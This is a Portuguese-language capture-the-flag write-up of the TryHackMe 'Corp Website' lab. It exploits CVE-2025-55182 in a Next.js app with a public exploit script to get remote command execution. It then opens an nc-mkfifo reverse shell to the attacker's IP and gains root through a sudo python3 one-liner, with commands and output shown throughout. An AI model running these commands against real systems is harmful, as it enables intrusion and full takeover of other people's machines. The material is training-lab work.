# TryHackMe – Corp Website

> ⚠️ Este relatório documenta exclusivamente a metodologia utilizada durante a resolução do desafio.
> As flags foram omitidas propositalmente.

---

## 📌 Visão Geral

O desafio apresentou uma aplicação web rodando na porta 3000.  
O objetivo era identificar vulnerabilidades exploráveis, obter execução remota de código (RCE) e realizar escalonamento de privilégio até root.

A abordagem adotada foi baseada em enumeração técnica, validação prática de vulnerabilidades detectadas e pós-exploração estruturada.

---

## 🧭 Reconhecimento Inicial

### 🔎 Varredura de Portas

Comando utilizado:

    nmap -sC -sV -p- <MACHINE_IP>

Resultado:
- Serviço web identificado na porta 3000.

---

## 🌐 Enumeração Web

Como o serviço estava exposto em uma porta não padrão, foquei na análise da aplicação web.

### 🔬 Identificação de Tecnologia

Comando utilizado:

    nuclei -u http://<MACHINE_IP>:3000

Principais achados:

- Aplicação baseada em Next.js
- Headers de segurança ausentes
- Detecção das seguintes possíveis vulnerabilidades:
  - CVE-2025-55182
  - CVE-2025-55184

A maioria dos resultados era informativa. Uma das CVEs apresentava potencial de exploração.

---

## 🧪 Validação da Vulnerabilidade

Ao invés de confiar apenas na detecção automatizada, validei manualmente a vulnerabilidade reportada.

Localizei um exploit público correspondente à CVE identificada.
https://github.com/Chocapikk/CVE-2025-55182

### 🐍 Configuração do Ambiente Python

    python3 -m venv venv
    source venv/bin/activate
    pip install -r requirements.txt

### 🚀 Execução do Exploit

    python exploit.py -u http://<MACHINE_IP>:3000 -c "whoami"

O retorno confirmou execução remota de comandos (RCE).

---

## 🖥 Pós-Exploração

Com RCE confirmada, toda a enumeração interna foi realizada utilizando o próprio exploit para execução remota de comandos.

### 📁 Identificação do Diretório Atual

Comando utilizado:

    python exploit.py -u http://<MACHINE_IP>:3000 -c "pwd"

Resultado:

    /app

Indicando diretório raiz da aplicação Next.js.

---

### 📂 Listagem da Estrutura da Aplicação

Comando utilizado:

    python exploit.py -u http://<MACHINE_IP>:3000 -c "ls -la"

Foram identificados:

- Dockerfile
- docker-compose.yml
- Estrutura padrão de projeto Next.js
- Diretórios `app`, `components`, `lib`

---

## 🏁 Obtenção da User Flag

Após identificar o usuário do processo, naveguei até o diretório home utilizando:

    python exploit.py -u http://<MACHINE_IP>:3000 -c "ls -la /home"
    python exploit.py -u http://<MACHINE_IP>:3000 -c "ls -la /home/daniel"

Localizei o arquivo correspondente à user flag e realizei sua leitura.

---

## 🔺 Escalonamento de Privilégio

Verifiquei permissões sudo com:

    python exploit.py -u http://<MACHINE_IP>:3000 -c "sudo -l"

Resultado relevante:

    (root) NOPASSWD: /usr/bin/python3

Essa configuração permite execução do interpretador Python como root sem necessidade de senha.

---

## 🧨 Elevação para Root

┌──(.venv)─(kali㉿kali)-[~/Desktop/tryhackme/temp/CVE-2025-55182]
└─$ python3 exploit.py -u http://[MACHINE_IP]:3000 -r -l [YOUR_IP] -p 4444 -P nc-mkfifo
[*] Starting reverse shell listener on [YOUR_IP]:4444
[*] Sending reverse shell payload...
Waiting for connection...
Reverse shell connection established from [MACHINE_IP]:49822!
sh: can't access tty; job control turned off

/app $ id

uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)

/app $ sudo python3 -c 'import os; os.system("/bin/ash")'

id

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

ls -la /root

total 16
drwx------    1 root     root          4096 Jan 28 08:29 .
drwxr-xr-x    1 root     root          4096 Jan 28 08:58 ..
drwxr-xr-x    1 root     root          4096 Jan 28 08:26 .npm
-rw-------    1 root     root            28 Jan 28 08:29 root.txt

sudo cat /root/root.txt

THM{****_***_**_***_******}

E localizei o arquivo da root flag.

---

## 🛠 Ferramentas Utilizadas

- Nmap
- Gobuster
- Nuclei
- Python (virtual environment)
- Exploit público para validação de CVE
- Comandos Linux executados remotamente via RCE

---

## 🧠 Habilidades Demonstradas

- Enumeração de serviços
- Identificação e validação de vulnerabilidades
- Exploração de execução remota de código
- Enumeração pós-exploração remota
- Análise de ambiente containerizado
- Escalonamento de privilégio via sudo mal configurado

---

## 📈 Conclusão

O desafio reforça a importância de:

- Validar vulnerabilidades detectadas por scanners
- Realizar enumeração estruturada após obter acesso
- Explorar corretamente permissões sudo
- Entender como aplicações containerizadas podem conter configurações inseguras

A abordagem foi baseada em metodologia técnica, priorizando validação prática e exploração controlada.
